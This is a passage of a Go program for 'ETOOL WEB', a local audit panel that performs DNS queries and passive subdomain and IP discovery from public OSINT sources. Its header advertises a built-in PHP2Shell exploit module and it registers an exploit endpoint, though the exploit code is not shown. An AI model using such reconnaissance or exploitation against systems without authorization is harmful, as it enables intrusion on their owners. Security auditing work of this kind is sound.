// ETOOL WEB — backend local autónomo (un solo binario, sin dependencias externas).
// Sirve el panel web embebido y ejecuta las fases de red en local:
// DNS, subdominios (crt.sh/certSpotter/VirusTotal), RDAP/ASN, captura HTTP/TLS
// y escaneo TCP connect propio.
//
// Diseño responsable: el escaneo es TCP connect (no sigiloso, sin privilegios), nunca
// evasión de IDS ni DoS; /api/scan exige authorized:true. Úsalo solo contra activos
// propios o con autorización por escrito.
//
// Seguridad del propio panel: el servidor solo escucha en 127.0.0.1, valida la
// cabecera Host (anti DNS-rebinding), rechaza orígenes ajenos y exige un token
// aleatorio por sesión en cada llamada a /api/*. Así ninguna web que visites
// puede usar tu ETOOL WEB local para escanear o hacer peticiones en tu nombre.
//
// Incluye módulo de explotación PHP2Shell (CVE-2026-109618 / CVE-2026-109619).
package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/rand"
	"crypto/subtle"
	"crypto/tls"
	"crypto/x509"
	"embed"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"html"
	"io"
	"log"
	"mime"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

//go:embed webapp/index.html
var webFS embed.FS

const version = "1.2"

const userAgent = "ETOOL-WEB/" + version

var (
	flagPort      = flag.Int("port", 8787, "puerto local preferido (si está ocupado se prueba otro)")
	flagNoBrowser = flag.Bool("no-browser", false, "no abrir el navegador automáticamente")
)

func main() {
	flag.Parse()
	loadVTKey()

	ln, addr := listen(*flagPort)
	token := newToken()

	// El token de sesión se inyecta en el HTML servido; nunca sale de 127.0.0.1.
	index, _ := webFS.ReadFile("webapp/index.html")
	index = bytes.Replace(index, []byte(`window.ETOOL_API="";`),
		[]byte(`window.ETOOL_API="";window.ETOOL_TOKEN="`+token+`";`), 1)

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" && r.URL.Path != "/index.html" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Header().Set("Cache-Control", "no-store")
		w.Header().Set("X-Frame-Options", "DENY")
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("Referrer-Policy", "no-referrer")
		w.Write(index)
	})

	mux.HandleFunc("/api/health", apiJSON(func(_ context.Context, _ map[string]any) (any, error) {
		return map[string]any{"ok": true, "version": version, "tool": "ETOOL WEB", "vt": getVT() != ""}, nil
	}))
	mux.HandleFunc("/api/dns", apiJSON(hDNS))
	mux.HandleFunc("/api/subdomains", apiJSON(hSubdomains))
	mux.HandleFunc("/api/paths", apiJSON(hPaths))
	mux.HandleFunc("/api/rdap", apiJSON(hRDAP))
	mux.HandleFunc("/api/http", apiJSON(hHTTP))
	mux.HandleFunc("/api/scan", apiJSON(hScan))
	mux.HandleFunc("/api/config", apiJSON(hConfig))
	mux.HandleFunc("/api/vt", apiJSON(hVT))
	mux.HandleFunc("/api/exploit", hExploit) // NDJSON en streaming

	panelURL := "http://" + addr + "/"
	fmt.Println()
	fmt.Println("  ETOOL WEB " + version + " — consola de auditoría local")
	fmt.Println("  --------------------------------------------")
	fmt.Println("  Servidor en:  " + panelURL)
	if *flagNoBrowser {
		fmt.Println("  Abre esa URL en tu navegador.")
	} else {
		fmt.Println("  Abriendo el navegador… (si no se abre, pega esa URL)")
		go openBrowser(panelURL)
	}
	fmt.Println("  Para salir: Ctrl+C o cierra esta ventana.")
	fmt.Println()

	srv := &http.Server{
		Handler:           guard(addr, token, mux),
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       30 * time.Second,
		WriteTimeout:      5 * time.Minute, // el exploit es intrusivo y puede tardar
		IdleTimeout:       2 * time.Minute,
	}

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-stop
		fmt.Println("\n  Cerrando ETOOL WEB…")
		ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()
		srv.Shutdown(ctx)
	}()

	if err := srv.Serve(ln); err != nil && !errors.Is(err, http.ErrServerClosed) {
		fmt.Println("servidor detenido:", err)
	}
}

func listen(preferred int) (net.Listener, string) {
	for _, p := range []int{preferred, 8787, 8788, 8799, 8080, 0} {
		ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", p))
		if err == nil {
			return ln, ln.Addr().String()
		}
	}
	panic("no se pudo abrir ningún puerto local")
}

func newToken() string {
	b := make([]byte, 24)
	if _, err := rand.Read(b); err != nil {
		panic("no se pudo generar el token de sesión: " + err.Error())
	}
	return hex.EncodeToString(b)
}

// guard protege el servidor local frente a webs de terceros:
// - Host debe ser 127.0.0.1/localhost/[::1] con nuestro puerto (anti DNS-rebinding).
// - Si llega Origin, debe ser el propio panel (sin CORS abierto).
// - /api/* exige POST, JSON y el token de sesión en X-ETOOL-Token.
func guard(addr, token string, h http.Handler) http.Handler {
	_, port, _ := net.SplitHostPort(addr)
	allowed := map[string]bool{
		"127.0.0.1:" + port: true,
		"localhost:" + port: true,
		"[::1]:" + port:     true,
	}
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if !allowed[strings.ToLower(r.Host)] {
			http.Error(w, "host no permitido", http.StatusForbidden)
			return
		}
		if o := r.Header.Get("Origin"); o != "" {
			u, err := url.Parse(o)
			if err != nil || u.Scheme != "http" || !allowed[strings.ToLower(u.Host)] {
				http.Error(w, "origen no permitido", http.StatusForbidden)
				return
			}
		}
		if strings.HasPrefix(r.URL.Path, "/api/") {
			if r.Method != http.MethodPost {
				w.Header().Set("Allow", "POST")
				http.Error(w, "método no permitido", http.StatusMethodNotAllowed)
				return
			}
			if subtle.ConstantTimeCompare([]byte(r.Header.Get("X-ETOOL-Token")), []byte(token)) != 1 {
				http.Error(w, "token de sesión no válido (recarga el panel)", http.StatusForbidden)
				return
			}
			if mt, _, _ := mime.ParseMediaType(r.Header.Get("Content-Type")); mt != "application/json" {
				http.Error(w, "se espera application/json", http.StatusUnsupportedMediaType)
				return
			}
			start := time.Now()
			h.ServeHTTP(w, r)
			log.Printf("%s (%.1fs)", r.URL.Path, time.Since(start).Seconds())
			return
		}
		h.ServeHTTP(w, r)
	})
}

type apiHandler func(ctx context.Context, body map[string]any) (any, error)

// apiJSON envuelve un handler que recibe el cuerpo decodificado y devuelve JSON.
// El contexto se cancela si el panel aborta la petición (botón Detener).
func apiJSON(fn apiHandler) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		w.Header().Set("Cache-Control", "no-store")
		body := map[string]any{}
		if r.Body != nil {
			b, _ := io.ReadAll(io.LimitReader(r.Body, 1<<20))
			if len(bytes.TrimSpace(b)) > 0 && json.Unmarshal(b, &body) != nil {
				writeErr(w, fmt.Errorf("JSON no válido"))
				return
			}
		}
		res, err := fn(r.Context(), body)
		if err != nil {
			writeErr(w, err)
			return
		}
		json.NewEncoder(w).Encode(res)
	}
}

func writeErr(w http.ResponseWriter, err error) {
	w.WriteHeader(http.StatusBadRequest)
	json.NewEncoder(w).Encode(map[string]any{"error": err.Error()})
}

func str(m map[string]any, k string) string {
	if v, ok := m[k].(string); ok {
		return strings.TrimSpace(v)
	}
	return ""
}

var reDomain = regexp.MustCompile(`^([a-z0-9_]([a-z0-9_-]{0,61}[a-z0-9])?\.)+[a-z][a-z0-9-]{0,61}[a-z0-9]$`)

func validDomain(s string) bool {
	return len(s) <= 253 && reDomain.MatchString(s)
}

func needDomain(b map[string]any) (string, error) {
	d := cleanHost(str(b, "domain"))
	if d == "" {
		return "", fmt.Errorf("falta 'domain'")
	}
	if !validDomain(d) {
		return "", fmt.Errorf("dominio no válido: %q", d)
	}
	return d, nil
}

/* ===================== DNS ===================== */

var resolver = &net.Resolver{}

func hDNS(ctx context.Context, b map[string]any) (any, error) {
	domain, err := needDomain(b)
	if err != nil {
		return nil, err
	}
	ctx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	type rec struct {
		Type  string `json:"type"`
		Value string `json:"value"`
		TTL   any    `json:"ttl"`
	}
	recs := []rec{}
	var mu sync.Mutex
	add := func(t, v string) { mu.Lock(); recs = append(recs, rec{t, v, nil}); mu.Unlock() }

	// Las consultas son independientes: se lanzan en paralelo.
	var wg sync.WaitGroup
	run := func(f func()) { wg.Add(1); go func() { defer wg.Done(); f() }() }

	run(func() {
		if ips, err := resolver.LookupIP(ctx, "ip4", domain); err == nil {
			for _, ip := range ips {
				add("A", ip.String())
			}
		}
	})
	run(func() {
		if ips, err := resolver.LookupIP(ctx, "ip6", domain); err == nil {
			for _, ip := range ips {
				add("AAAA", ip.String())
			}
		}
	})
	run(func() {
		if cn, err := resolver.LookupCNAME(ctx, domain); err == nil {
			cn = strings.TrimSuffix(cn, ".")
			if cn != "" && !strings.EqualFold(cn, domain) {
				add("CNAME", cn)
			}
		}
	})
	run(func() {
		if ns, err := resolver.LookupNS(ctx, domain); err == nil {
			for _, n := range ns {
				add("NS", strings.TrimSuffix(n.Host, "."))
			}
		}
	})
	run(func() {
		if mx, err := resolver.LookupMX(ctx, domain); err == nil {
			for _, m := range mx {
				add("MX", fmt.Sprintf("%d %s", m.Pref, strings.TrimSuffix(m.Host, ".")))
			}
		}
	})
	run(func() {
		if txt, err := resolver.LookupTXT(ctx, domain); err == nil {
			for _, t := range txt {
				add("TXT", t)
			}
		}
	})
	run(func() {
		if txt, err := resolver.LookupTXT(ctx, "_dmarc."+domain); err == nil {
			for _, t := range txt {
				if strings.Contains(strings.ToLower(t), "dmarc1") {
					add("TXT", t)
				}
			}
		}
	})
	// SOA + bit AD (DNSSEC) y CAA vía consulta DNS cruda (la stdlib no los expone).
	var ad bool
	caaChecked := false
	run(func() {
		if msg, err := rawQuery(ctx, domain, 6); err == nil { // 6 = SOA
			mu.Lock()
			ad = msg[3]&0x20 != 0
			mu.Unlock()
			if soa := parseSOA(msg); soa != "" {
				add("SOA", soa)
			}
		}
	})
	caaDomain := ""
	run(func() {
		// CAA se hereda del dominio padre (RFC 8659): se sube por el árbol hasta encontrarlo.
		labels := strings.Split(domain, ".")
		for i := 0; i < len(labels)-1; i++ {
			name := strings.Join(labels[i:], ".")
			msg, err := rawQuery(ctx, name, 257) // 257 = CAA
			if err != nil {
				return // sin respuesta fiable: no se afirma nada sobre CAA
			}
			if caa := parseCAA(msg); len(caa) > 0 {
				for _, c := range caa {
					add("CAA", c)
				}
				mu.Lock()
				caaDomain = name
				mu.Unlock()
				break
			}
		}
		mu.Lock()
		caaChecked = true
		mu.Unlock()
	})
	wg.Wait()
	// Sin ningún otro registro no hay garantía de que el resolvedor funcione:
	// no se afirma la ausencia de CAA para evitar falsos positivos.
	if caaDomain == "" && len(recs) == 0 {
		caaChecked = false
	}

	order := map[string]int{"A": 0, "AAAA": 1, "CNAME": 2, "NS": 3, "MX": 4, "TXT": 5, "CAA": 6, "SOA": 7}
	sort.SliceStable(recs, func(i, j int) bool {
		if order[recs[i].Type] != order[recs[j].Type] {
			return order[recs[i].Type] < order[recs[j].Type]
		}
		return recs[i].Value < recs[j].Value
	})
	return map[string]any{"records": recs, "dnssec": ad, "caa_checked": caaChecked, "caa_domain": caaDomain}, nil
}

var dnsServers = []string{"1.1.1.1:53", "8.8.8.8:53", "9.9.9.9:53"}

// rawQuery envía una consulta UDP (RD=1, AD=1) probando varios resolvedores públicos
// y devuelve el mensaje de respuesta validado (mismo ID, QR=1, RCODE 0 o NXDOMAIN).
func rawQuery(ctx context.Context, name string, qtype uint16) ([]byte, error) {
	var lastErr error = errors.New("sin respuesta DNS")
	for _, server := range dnsServers {
		if ctx.Err() != nil {
			return nil, ctx.Err()
		}
		msg, id := buildQuery(name, qtype)
		d := net.Dialer{Timeout: 3 * time.Second}
		c, err := d.DialContext(ctx, "udp", server)
		if err != nil {
			lastErr = err
			continue
		}
		c.SetDeadline(time.Now().Add(3 * time.Second))
		if _, err := c.Write(msg); err != nil {
			c.Close()
			lastErr = err
			continue
		}
		buf := make([]byte, 4096)
		n, err := c.Read(buf)
		c.Close()
		if err != nil {
			lastErr = err
			continue
		}
		resp := buf[:n]
		if n < 12 || binary.BigEndian.Uint16(resp[0:]) != id || resp[2]&0x80 == 0 {
			lastErr = errors.New("respuesta DNS no válida")
			continue
		}
		if rcode := resp[3] & 0x0F; rcode != 0 && rcode != 3 {
			lastErr = fmt.Errorf("RCODE %d", rcode)
			continue
		}
		return resp, nil
	}
	return nil, lastErr
}

func buildQuery(name string, qtype uint16) ([]byte, uint16) {
	var idb [2]byte
	rand.Read(idb[:])
	id := binary.BigEndian.Uint16(idb[:])
	b := make([]byte, 12, 12+len(name)+6)
	binary.BigEndian.PutUint16(b[0:], id)
	binary.BigEndian.PutUint16(b[2:], 0x0120) // RD=1, AD=1 (pedir validación)
	binary.BigEndian.PutUint16(b[4:], 1)      // QDCOUNT
	for _, part := range strings.Split(strings.TrimSuffix(name, "."), ".") {
		if len(part) > 63 {
			part = part[:63]
		}
		b = append(b, byte(len(part)))
		b = append(b, part...)
	}
	b = append(b, 0x00)
	q := make([]byte, 4)
	binary.BigEndian.PutUint16(q[0:], qtype)
	binary.BigEndian.PutUint16(q[2:], 1) // IN
	return append(b, q...), id
}

type dnsRR struct {
	typ     uint16
	rdStart int
	rdLen   int
}

// answers recorre la sección de respuesta y devuelve los registros con su posición.
func answers(msg []byte) []dnsRR {
	if len(msg) < 12 {
		return nil
	}
	qd := int(binary.BigEndian.Uint16(msg[4:]))
	an := int(binary.BigEndian.Uint16(msg[6:]))
	off := 12
	for i := 0; i < qd; i++ {
		_, o := readName(msg, off)
		off = o + 4
	}
	var out []dnsRR
	for i := 0; i < an && off+10 <= len(msg); i++ {
		_, o := readName(msg, off)
		if o+10 > len(msg) {
			break
		}
		rr := dnsRR{typ: binary.BigEndian.Uint16(msg[o:]), rdStart: o + 10, rdLen: int(binary.BigEndian.Uint16(msg[o+8:]))}
		if rr.rdStart+rr.rdLen > len(msg) {
			break
		}
		out = append(out, rr)
		off = rr.rdStart + rr.rdLen
	}
	return out
}

// parseSOA extrae mname y rname del primer registro SOA de la sección de respuesta.
func parseSOA(msg []byte) string {
	for _, rr := range answers(msg) {
		if rr.typ == 6 {
			mname, p := readName(msg, rr.rdStart)
			rname, _ := readName(msg, p)
			return "primary " + strings.TrimSuffix(mname, ".") + " · resp " + strings.TrimSuffix(rname, ".")
		}
	}
	return ""
}

// parseCAA devuelve los registros CAA como texto «flags tag "valor"».
func parseCAA(msg []byte) []string {
	var out []string
	for _, rr := range answers(msg) {
		if rr.typ != 257 || rr.rdLen < 2 {
			continue
		}
		rd := msg[rr.rdStart : rr.rdStart+rr.rdLen]
		tl := int(rd[1])
		if 2+tl > len(rd) {
			continue
		}
		out = append(out, fmt.Sprintf("%d %s %q", rd[0], rd[2:2+tl], rd[2+tl:]))
	}
	return out
}

func readName(msg []byte, off int) (string, int) {
	var labels []string
	jumped := false
	next := off
	guard := 0
	for {
		if off >= len(msg) || guard > 64 {
			break
		}
		guard++
		l := int(msg[off])
		if l == 0 {
			off++
			if !jumped {
				next = off
			}
			break
		}
		if l&0xC0 == 0xC0 {
			if off+1 >= len(msg) {
				break
			}
			ptr := int(binary.BigEndian.Uint16(msg[off:]) & 0x3FFF)
			if !jumped {
				next = off + 2
			}
			jumped = true
			off = ptr
			continue
		}
		off++
		if off+l > len(msg) {
			break
		}
		labels = append(labels, string(msg[off:off+l]))
		off += l
	}
	return strings.Join(labels, ".") + ".", next
}

/* ===================== Subdominios (CT + OSINT + VirusTotal) ===================== */

type subFetcher struct {
	name string
	fn   func(context.Context, string, *subSet, *ipSet) error
}

// subSources: fuentes pasivas de subdominios. Las sin clave van siempre;
// VirusTotal solo si hay clave configurada.
func subSources() []subFetcher {
	s := []subFetcher{
		{"crt.sh", fetchCrtsh},
		{"certSpotter", fetchCertspotter},
		{"OTX", fetchOTXSubs},
		{"HackerTarget", fetchHackerTarget},
		{"Anubis", fetchAnubis},
		{"Wayback", fetchWaybackSubs},
		{"urlscan.io", fetchURLScanSubs},
	}
	if getVT() != "" {
		s = append(s, subFetcher{"VirusTotal", fetchVTSubs})
	}
	return s
}

func hSubdomains(ctx context.Context, b map[string]any) (any, error) {
	domain, err := needDomain(b)
	if err != nil {
		return nil, err
	}
	resolve := true
	if v, ok := b["resolve"].(bool); ok {
		resolve = v
	}
	sources := subSources()

	// Las fuentes se consultan en paralelo: el tiempo total es el de la más lenta.
	set := &subSet{m: map[string]map[string]bool{}}
	ips := &ipSet{m: map[string]*ipHint{}}
	errs := make([]error, len(sources))
	var wg sync.WaitGroup
	for i, s := range sources {
		wg.Add(1)
		go func(i int, s subFetcher) {
			defer wg.Done()
			errs[i] = s.fn(ctx, domain, set, ips)
		}(i, s)
	}
	wg.Wait()
	if ctx.Err() != nil {
		return nil, ctx.Err()
	}

	var warns []string
	okSources := []string{}
	for i, s := range sources {
		if errs[i] != nil {
			warns = append(warns, s.name+": "+errs[i].Error())
		} else {
			okSources = append(okSources, s.name)
		}
	}

	names := set.names()
	truncated := false
	if len(names) > 2000 {
		names, truncated = names[:2000], true
	}
	// Resolución DNS: separa subdominios vivos de históricos y descubre IPs.
	out := make([]map[string]any, len(names))
	if resolve {
		sem := make(chan struct{}, 50)
		var rwg sync.WaitGroup
		for i, nm := range names {
			rwg.Add(1)
			sem <- struct{}{}
			go func(i int, nm string) {
				defer rwg.Done()
				defer func() { <-sem }()
				rec := map[string]any{"name": nm, "sources": set.sources(nm), "alive": false, "ips": []string{}}
				rctx, cancel := context.WithTimeout(ctx, 4*time.Second)
				addrs, err := resolver.LookupHost(rctx, nm)
				cancel()
				if err == nil && len(addrs) > 0 {
					rec["alive"] = true
					rec["ips"] = addrs
					for _, ip := range addrs {
						ips.add(ip, "DNS "+nm, nm)
					}
				}
				out[i] = rec
			}(i, nm)
		}
		rwg.Wait()
	} else {
		for i, nm := range names {
			out[i] = map[string]any{"name": nm, "sources": set.sources(nm), "alive": nil, "ips": []string{}}
		}
	}
	if ctx.Err() != nil {
		return nil, ctx.Err()
	}

	if len(names) == 0 && len(warns) > 0 {
		return nil, fmt.Errorf("sin resultados · %s", strings.Join(warns, " | "))
	}
	alive := 0
	for _, r := range out {
		if a, _ := r["alive"].(bool); a {
			alive++
		}
	}
	res := map[string]any{
		"subdomains": out, "count": len(out), "alive": alive, "resolved": resolve,
		"ips": ips.list(), "sources": strings.Join(okSources, " + "), "truncated": truncated,
	}
	if len(warns) > 0 {
		res["warnings"] = warns
	}
	return res, nil
}

/* ---------- conjuntos concurrentes ---------- */

type subSet struct {
	mu sync.Mutex
	m  map[string]map[string]bool // subdominio -> conjunto de fuentes
}

func (s subSet) add(nm, domain, src string) {
	nm = strings.TrimSpace(strings.ToLower(nm))
	nm = strings.TrimSuffix(strings.TrimPrefix(nm, "."), ".")
	if nm == "" || strings.ContainsAny(nm, "@ */:") {
		return
	}
	// Debe ser el dominio o un subdominio real («evilejemplo.com» no vale para «ejemplo.com»).
	if nm != domain && !strings.HasSuffix(nm, "."+domain) {
		return
	}
	s.mu.Lock()
	if s.m[nm] == nil {
		s.m[nm] = map[string]bool{}
	}
	s.m[nm][src] = true
	s.mu.Unlock()
}

func (s *subSet) names() []string {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]string, 0, len(s.m))
	for k := range s.m {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

func (s *subSet) sources(nm string) []string {
	s.mu.Lock()
	defer s.mu.Unlock()
	var out []string
	for src := range s.m[nm] {
		out = append(out, src)
	}
	sort.Strings(out)
	return out
}

// ipSet recopila IPs descubiertas por OSINT/resolución, con sus fuentes y hosts asociados.
type ipHint struct {
	sources map[string]bool
	hosts   map[string]bool
}
type ipSet struct {
	mu sync.Mutex
	m  map[string]*ipHint
}

func (s *ipSet) add(ip, src, host string) {
	p := net.ParseIP(ip)
	if p == nil {
		return
	}
	ip = p.String()
	s.mu.Lock()
	defer s.mu.Unlock()
	h := s.m[ip]
	if h == nil {
		h = &ipHint{sources: map[string]bool{}, hosts: map[string]bool{}}
		s.m[ip] = h
	}
	if src != "" {
		h.sources[src] = true
	}
	if host != "" {
		h.hosts[host] = true
	}
}

func (s *ipSet) list() []map[string]any {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]map[string]any, 0, len(s.m))
	for ip, h := range s.m {
		out = append(out, map[string]any{"ip": ip, "sources": keys(h.sources), "hosts": keys(h.hosts)})
	}
	sort.Slice(out, func(i, j int) bool { return out[i]["ip"].(string) < out[j]["ip"].(string) })
	return out
}

func keys(m map[string]bool) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

var httpClient = &http.Client{Timeout: 60 * time.Second}

func getJSONBody(ctx context.Context, rawURL string, timeout time.Duration, limit int64, hdr map[string]string) (int, []byte, error) {
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, "GET", rawURL, nil)
	if err != nil {
		return 0, nil, err
	}
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Accept", "application/json")
	for k, v := range hdr {
		req.Header.Set(k, v)
	}
	resp, err := httpClient.Do(req)
	if err != nil {
		return 0, nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, limit))
	return resp.StatusCode, body, err
}

// fetchCrtsh: crt.sh es lento; timeout amplio + un reintento.
func fetchCrtsh(ctx context.Context, domain string, set *subSet, _ *ipSet) error {
	u := "https://crt.sh/?q=" + url.QueryEscape("%."+domain) + "&output=json"
	var lastErr error
	for attempt := 0; attempt < 2; attempt++ {
		if ctx.Err() != nil {
			return ctx.Err()
		}
		code, body, err := getJSONBody(ctx, u, 45*time.Second, 32<<20, nil)
		if err != nil {
			lastErr = fmt.Errorf("sin respuesta (saturado); reintenta")
			continue
		}
		if code != 200 {
			lastErr = fmt.Errorf("HTTP %d (saturado); reintenta", code)
			continue
		}
		var rows []struct {
			NameValue string `json:"name_value"`
		}
		if json.Unmarshal(body, &rows) != nil {
			lastErr = fmt.Errorf("respuesta no JSON (saturado)")
			continue
		}
		for _, r := range rows {
			for _, nm := range strings.Split(r.NameValue, "\n") {
				set.add(nm, domain, "crt.sh")
			}
		}
		return nil
	}
	return lastErr
}

// fetchCertspotter: fuente de respaldo (API pública de SSLMate, sin clave para uso ligero).
func fetchCertspotter(ctx context.Context, domain string, set *subSet, _ *ipSet) error {
	u := "https://api.certspotter.com/v1/issuances?domain=" + url.QueryEscape(domain) + "&include_subdomains=true&expand=dns_names"
	code, body, err := getJSONBody(ctx, u, 20*time.Second, 12<<20, nil)
	if err != nil {
		return fmt.Errorf("no accesible")
	}
	if code == 429 {
		return fmt.Errorf("límite de peticiones alcanzado")
	}
	if code != 200 {
		return fmt.Errorf("HTTP %d", code)
	}
	var rows []struct {
		DNSNames []string `json:"dns_names"`
	}
	if json.Unmarshal(body, &rows) != nil {
		return fmt.Errorf("respuesta no JSON")
	}
	for _, r := range rows {
		for _, nm := range r.DNSNames {
			set.add(nm, domain, "certSpotter")
		}
	}
	return nil
}

// getBody es como getJSONBody pero sin forzar Accept JSON (para respuestas de texto).
func getBody(ctx context.Context, rawURL string, timeout time.Duration, limit int64) (int, []byte, error) {
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, "GET", rawURL, nil)
	if err != nil {
		return 0, nil, err
	}
	req.Header.Set("User-Agent", userAgent)
	resp, err := httpClient.Do(req)
	if err != nil {
		return 0, nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, limit))
	return resp.StatusCode, body, err
}

// hostFromURL extrae el hostname (sin puerto) de una URL; "" si no es válida.
func hostFromURL(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}
	if !strings.Contains(raw, "://") {
		raw = "http://" + raw
	}
	u, err := url.Parse(raw)
	if err != nil {
		return ""
	}
	return strings.ToLower(u.Hostname())
}

// fetchOTXSubs: AlienVault OTX passive DNS — aporta subdominios e IPs sin clave.
func fetchOTXSubs(ctx context.Context, domain string, set *subSet, ips *ipSet) error {
	u := "https://otx.alienvault.com/api/v1/indicators/domain/" + url.PathEscape(domain) + "/passive_dns"
	code, body, err := getJSONBody(ctx, u, 20*time.Second, 12<<20, nil)
	if err != nil {
		return fmt.Errorf("no accesible")
	}
	if code != 200 {
		return fmt.Errorf("HTTP %d", code)
	}
	var j struct {
		PassiveDNS []struct {
			Hostname string `json:"hostname"`
			Address  string `json:"address"`
		} `json:"passive_dns"`
	}
	if json.Unmarshal(body, &j) != nil {
		return fmt.Errorf("respuesta no JSON")
	}
	for _, r := range j.PassiveDNS {
		h := strings.ToLower(strings.TrimSuffix(r.Hostname, "."))
		set.add(h, domain, "OTX")
		if net.ParseIP(r.Address) != nil && (h == domain || strings.HasSuffix(h, "."+domain)) {
			ips.add(r.Address, "OTX passive DNS", h)
		}
	}
	return nil
}

// fetchHackerTarget: devuelve líneas "host,ip" (texto). Cupo diario reducido sin clave.
func fetchHackerTarget(ctx context.Context, domain string, set *subSet, ips *ipSet) error {
	u := "https://api.hackertarget.com/hostsearch/?q=" + url.QueryEscape(domain)
	code, body, err := getBody(ctx, u, 15*time.Second, 2<<20)
	if err != nil {
		return fmt.Errorf("no accesible")
	}
	txt := strings.TrimSpace(string(body))
	if code != 200 || strings.HasPrefix(txt, "error") || strings.Contains(txt, "API count exceeded") {
		return fmt.Errorf("límite diario alcanzado o sin datos")
	}
	for _, line := range strings.Split(txt, "\n") {
		parts := strings.SplitN(strings.TrimSpace(line), ",", 2)
		if parts[0] == "" {
			continue
		}
		h := strings.ToLower(parts[0])
		set.add(h, domain, "HackerTarget")
		if len(parts) == 2 && net.ParseIP(parts[1]) != nil {
			ips.add(parts[1], "HackerTarget", h)
		}
	}
	return nil
}

// fetchAnubis: lista de subdominios de jldc.me (sin clave).
func fetchAnubis(ctx context.Context, domain string, set *subSet, _ *ipSet) error {
	u := "https://jldc.me/anubis/subdomains/" + url.PathEscape(domain)
	code, body, err := getJSONBody(ctx, u, 15*time.Second, 4<<20, nil)
	if err != nil {
		return fmt.Errorf("no accesible")
	}
	if code == 404 {
		return nil // sin datos para el dominio
	}
	if code != 200 {
		return fmt.Errorf("HTTP %d", code)
	}
	var names []string
	if json.Unmarshal(body, &names) != nil {
		return fmt.Errorf("respuesta no JSON")
	}
	for _, nm := range names {
		set.add(nm, domain, "Anubis")
	}
	return nil
}

// fetchWaybackSubs: hostnames de URLs archivadas por Wayback Machine (CDX).
func fetchWaybackSubs(ctx context.Context, domain string, set *subSet, _ *ipSet) error {
	u := "https://web.archive.org/cdx/search/cdx?url=." + url.QueryEscape(domain) +
		"&output=json&fl=original&collapse=urlkey&limit=20000"
	code, body, err := getJSONBody(ctx, u, 40*time.Second, 24<<20, nil)
	if err != nil {
		return fmt.Errorf("no accesible")
	}
	if code != 200 {
		return fmt.Errorf("HTTP %d", code)
	}
	var rows [][]string
	if json.Unmarshal(body, &rows) != nil {
		return fmt.Errorf("respuesta no JSON")
	}
	for i, r := range rows {
		if i == 0 || len(r) == 0 { // la primera fila es la cabecera
			continue
		}
		if h := hostFromURL(r[0]); h != "" {
			set.add(h, domain, "Wayback")
		}
	}
	return nil
}

// fetchURLScanSubs: dominios vistos en escaneos públicos de urlscan.io (sin clave, cupo bajo).
func fetchURLScanSubs(ctx context.Context, domain string, set *subSet, _ *ipSet) error {
	u := "https://urlscan.io/api/v1/search/?q=domain:" + url.QueryEscape(domain) + "&size=1000"
	code, body, err := getJSONBody(ctx, u, 20*time.Second, 12<<20, nil)
	if err != nil {
		return fmt.Errorf("no accesible")
	}
	if code == 429 {
		return fmt.Errorf("límite de peticiones alcanzado")
	}
	if code != 200 {
		return fmt.Errorf("HTTP %d", code)
	}
	var j struct {
		Results []struct {
			Page struct {
				Domain string `json:"domain"`
			} `json:"page"`
		} `json:"results"`
	}
	if json.Unmarshal(body, &j) != nil {
		return fmt.Errorf("respuesta no JSON")
	}
	for _, r := range j.Results {
		set.add(r.Page.Domain, domain, "urlscan.io")
	}
	return nil
}

/* ===================== Rutas / URLs (OSINT pasivo + exposición activa) ===================== */

type pathSet struct {
	mu sync.Mutex
	m  map[string]map[string]bool // ruta -> conjunto de fuentes
}

func (s *pathSet) add(raw, src string) {
	p := normalizePath(raw)
	if p == "" {
		return
	}
	s.mu.Lock()
	if s.m[p] == nil {
		s.m[p] = map[string]bool{}
	}
	s.m[p][src] = true
	s.mu.Unlock()
}

func (s *pathSet) list() []map[string]any {
	s.mu.Lock()
	defer s.mu.Unlock()
	ks := make([]string, 0, len(s.m))
	for k := range s.m {
		ks = append(ks, k)
	}
	sort.Strings(ks)
	out := make([]map[string]any, 0, len(ks))
	for _, k := range ks {
		out = append(out, map[string]any{"path": k, "sources": keys(s.m[k])})
	}
	return out
}

// normalizePath devuelve la ruta+query de una URL o ruta, limpia y acotada.
func normalizePath(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}
	p := raw
	if strings.Contains(raw, "://") {
		u, err := url.Parse(raw)
		if err != nil {
			return ""
		}
		p = u.EscapedPath()
		if u.RawQuery != "" {
			p += "?" + u.RawQuery
		}
	}
	if !strings.HasPrefix(p, "/") {
		p = "/" + p
	}
	if p == "/" || len(p) > 512 || strings.ContainsAny(p, " \t\r\n<>\"") {
		return ""
	}
	return p
}

